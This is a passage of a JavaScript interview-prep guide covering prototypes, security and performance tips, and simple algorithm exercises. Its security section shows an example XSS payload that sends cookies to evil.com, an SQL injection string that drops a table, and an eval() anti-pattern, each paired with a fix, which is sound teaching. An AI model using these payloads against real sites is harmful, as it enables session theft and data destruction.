💡 When you access dev.greet(), JS first looks on the dev object itself, then up the prototype chain through Developer → Person → Object. This is prototypal inheritance — objects inherit from other objects through this chain.

20 — Security & Performance
Q. What is eval()? What is XSS (Cross-Site Scripting) attack? What is SQL Injection? Security best practices? Performance best practices?
▾

eval() is a function that takes a string and executes it as JavaScript code. It is extremely dangerous because if the string comes from user input, an attacker can run any code on your site. Never use eval() in production code.

// eval() — executes a string as code
eval('console.log("Hello")');  // works
eval(userInput);               // ❌ NEVER do this — can run malicious code

XSS — Cross-Site Scripting

An attacker injects malicious JavaScript into your website (e.g., through a comment or search input) that then runs in other users' browsers — stealing cookies, session tokens, or performing actions as the victim.

// Attacker submits this as a product review:
// <script>fetch('https://evil.com/?c='+document.cookie)</script>

// If you render it with innerHTML — script runs!
el.innerHTML = userComment;   // ❌ dangerous

// Fix: use textContent — treats everything as plain text
el.textContent = userComment; // ✅ safe — no HTML rendered

SQL Injection

Attacker inserts SQL commands into form inputs that get executed against your database. Example: entering '; DROP TABLE users; -- as a username could delete your database. Prevented server-side with parameterized queries — cannot be fixed with JS alone.

Security Best Practices

  • Never use eval() or innerHTML with user-provided data
  • Always use textContent for displaying user-generated content
  • Validate AND sanitize all inputs on both client AND server
  • Use HTTPS — never transmit sensitive data over plain HTTP
  • Store auth tokens in httpOnly cookies, not localStorage
  • Implement Content Security Policy (CSP) headers
  • Never expose API keys in front-end JavaScript
  • Use rel="noopener noreferrer" on target="_blank" links

Performance Best Practices

  • Debounce events: Don't fire on every keystroke — wait until typing stops
  • Throttle events: Limit scroll/resize handlers to run at most once per interval
  • Use requestAnimationFrame for smooth animations instead of setInterval
  • Lazy load images and heavy JS modules — only load when needed
  • Cache DOM queries: Store document.getElementById() results in variables, don't query repeatedly
  • Minimize DOM manipulation: Batch updates, use DocumentFragment for multiple inserts
  • Use Web Workers for CPU-heavy calculations — keeps UI thread free
  • Avoid memory leaks: Remove event listeners when elements are removed

Q. Check if a number is prime

function isPrime(n) {
  if (n < 2) return false;           // 0 and 1 are not prime
  if (n === 2) return true;           // 2 is prime
  if (n % 2 === 0) return false;     // even numbers (except 2) aren't prime
  for (let i = 3; i <= Math.sqrt(n); i += 2) {
    if (n % i === 0) return false;   // divisible — not prime
  }
  return true;
}
isPrime(7);   // true
isPrime(12);  // false
isPrime(17);  // true

function factorial(n) {
  if (n < 0) throw new Error('No factorial for negative numbers');
  if (n === 0 || n === 1) return 1;
  return n * factorial(n - 1);
}

function longestCommonPrefix(words) {
  if (!words.length) return '';
  let prefix = words[0];  // start with first word as prefix
  for (const word of words) {
    // Keep trimming prefix until word starts with it
    while (!word.startsWith(prefix)) {
      prefix = prefix.slice(0, -1);  // remove last character
      if (!prefix) return '';
    }
  }
  return prefix;
}

Q. Calculate the Fibonacci sequence up to a given number

function fibonacci(limit) {
  const seq = [0, 1];
  while (true) {
    const next = seq[seq.length - 1] + seq[seq.length - 2];
    if (next > limit) break;
    seq.push(next);
  }
  return seq;
}
